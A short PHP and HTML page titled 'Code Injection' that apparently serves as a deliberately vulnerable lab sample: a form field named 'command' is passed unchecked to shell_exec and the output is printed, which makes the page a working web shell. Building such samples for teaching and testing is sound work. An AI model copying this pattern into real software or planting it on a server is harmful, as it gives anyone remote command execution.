<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Code Injection</title>
</head>
<body>
	<form name="ping" action="#" method="GET">
			<p>
				Enter Your Command:
				<input type="text" name="command" size="30">
				<input type="submit" name="Submit" value="Submit">
			</p>

		</form>

</body>
</html>



<?php 
$target = $_GET['command'];
$cmd2 = shell_exec("$target");
echo "<pre>{$cmd2}<pre>"



 ?>